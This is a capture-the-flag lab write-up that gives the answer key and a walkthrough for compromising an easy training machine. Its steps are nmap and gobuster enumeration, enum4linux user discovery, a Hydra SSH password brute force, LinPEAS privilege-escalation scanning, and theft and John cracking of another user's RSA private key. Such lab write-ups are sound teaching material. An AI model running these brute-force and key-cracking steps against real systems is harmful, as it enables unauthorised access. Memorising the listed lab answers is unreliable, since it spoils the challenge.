# Basic Pentesting Write-Up 🛡️🔍💻

**Date:** 02.02.2025  
**Difficulty:** Easy

---

## Questions and Answers: ❓📝✅

1. **What is the name of the hidden directory on the web server (enter name without /)?**  
   `development`
2. **What is the username?**  
   `jan`
3. **What is the password?**  
   `armando`
4. **What service do you use to access the server (answer in abbreviation in all caps)?**  
   `SSH`
5. **What is the name of the other user you found (all lower case)?**  
   `kay`
6. **What is the final password you obtain?**  
   `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

---

## Obtained Information: 📄🔎

- **Target IP Address:** `<IP_ADDRESS>`
- **Web Server:** Apache/2.4.18 (Ubuntu)
- **Potentially weak credential policy** – Jan's password is easily crackable.
- **Apache Struts version:** 2.5.12 (REST plugin).
- **SMB Protocol detected.**
- **Users discovered:** `jan` and `kay`.
- **jan's password:** `armando`
- **kay's private key passphrase:** `beeswax`

---

## Walkthrough 🚀🕵️‍♂️

### 1. Initial Reconnaissance with Nmap 🔍

To identify open ports and running services:

```bash
nmap -sV <IP_ADDRESS>
```

**Results:**

- Open ports: `22 (SSH)`, `80 (HTTP)`, `139 (SMB)`, `445 (SMB)`, `8009 (AJP)`, `8080 (Tomcat)`
- Host is running **Apache 2.4.18**, **SMB**, and **Apache Tomcat 9.0.7**

### 2. Web Enumeration with Gobuster 🌐🛠️

Checking for hidden directories:

```bash
gobuster dir -u "http://<IP_ADDRESS>:80" -w ./Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -r
```

**Results:**

- `/development` (Status: 200) ✅
- `/server-status` (Status: 403)

Inside `/development`, we find two text files: `j.txt` and `dev.txt`, revealing a weak password policy and the use of **Apache Struts 2.5.12**.

### 3. SMB Enumeration 📂📡

Checking for SMB shares and users:

```bash
enum4linux -a <IP_ADDRESS>
```

**Results:**

- **Discovered users:** `jan` and `kay`

### 4. Brute-Forcing SSH Credentials 🔑🛠️

Since `jan` has weak credentials, we attempt brute force with Hydra:

```bash
hydra -l jan -P ./Tools/wordlists/rockyou.txt ssh://<IP_ADDRESS>
```

**Results:**

- **jan's password:** `armando` ✅

Using SSH to connect:

```bash
ssh jan@<IP_ADDRESS>
```

### 5. Privilege Escalation with LinPEAS 🏗️🔍

Uploading and running LinPEAS to identify privilege escalation vectors:

```bash
scp ./linpeas.sh jan@<IP_ADDRESS>:/dev/shm
ssh jan@<IP_ADDRESS>
chmod +x /dev/shm/linpeas.sh
./dev/shm/linpeas.sh > linpeas.txt
```

**Results:**

- **RSA private key found in kay's home directory.**

### 6. Cracking RSA Key with John the Ripper 🗝️💥

Extracting and cracking the key:

```bash
python3 /opt/john/ssh2john.py ./rsa_key > hash.txt
john --wordlist="./Tools/wordlists/rockyou.txt" --format=ssh hash.txt
```

**Results:**

- **Passphrase for RSA key:** `beeswax` ✅

Using the key to log in as `kay`:

```bash
chmod 600 rsa_key
ssh -i rsa_key kay@<IP_ADDRESS>
```

### 7. Obtaining the Final Flag 🏁🔓

Inside kay's home directory:

```bash
cat pass.bak
```

**Final Password:** `heresareallystrongpasswordthatfollowsthepasswordpolicy$$` ✅

---

## Reflection & Questions for Further Research 🤔💡

- **Why does Metasploit’s `auxiliary(scanner/smb/smb_enumusers)` fail while `enum4linux` works?**
- **Why is it recommended to upload files to `/dev/shm`?**
- **Why must `chmod 600 rsa_key` be applied before using the SSH key?**

---

## Summary & Takeaways 📌📖

- **Enumeration is key.** Each step built upon previous discoveries.
- **Weak passwords are a common vulnerability.** Using Hydra to crack jan’s password allowed further access.
- **Privileged file discovery is crucial.** The RSA key in kay’s home directory was the gateway to full access.
- **Automation speeds up workflow.** Tools like `nmap`, `gobuster`, `hydra`, and `john` streamline penetration testing.
